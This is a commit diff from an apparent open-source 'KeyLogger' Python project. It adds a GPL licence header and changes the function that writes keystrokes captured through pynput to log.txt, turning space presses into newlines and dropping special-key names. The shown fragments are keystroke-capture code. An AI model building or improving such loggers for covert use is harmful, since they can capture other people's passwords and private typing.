4e6aece175748ec52b18b0015db1fccaa2d244c8
XenonLab <xenonlab.develop@gmail.com>
2019-03-30 01:09:09 +0100

    add log string separators + license header

--- main.py
+++ main.py
@@ -1,5 +1,21 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
+
+"""
+Copyright (C) 2019 Stefano Peris <xenonlab.develop@gmail.com>
+Github repository: <https://github.com/XenonLab-Studio/KeyLogger>
+This program is free software: you can redistribute it and/or modify
+it under the terms of the GNU General Public License as published by
+the Free Software Foundation, either version 3 of the License, or
+(at your option) any later version.
+This program is distributed in the hope that it will be useful,
+but WITHOUT ANY WARRANTY; without even the implied warranty of
+MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+GNU General Public License for more details.
+You should have received a copy of the GNU General Public License
+along with this program.  If not, see <http://www.gnu.org/licenses/>.
+"""
+
 
 from pynput.keyboard import Key, Listener
 
@@ -21,7 +37,11 @@ def on_press(key):
 def write_file(keys):
     with open("log.txt", "a") as f:
         for key in keys:
-            f.write(key)
+            k = str(key).replace("'", "")
+            if k.find("space") > 0:
+                f.write('\n')
+            elif k.find("Key") == -1:
+                f.write(k)
 
 
 def on_release(key):
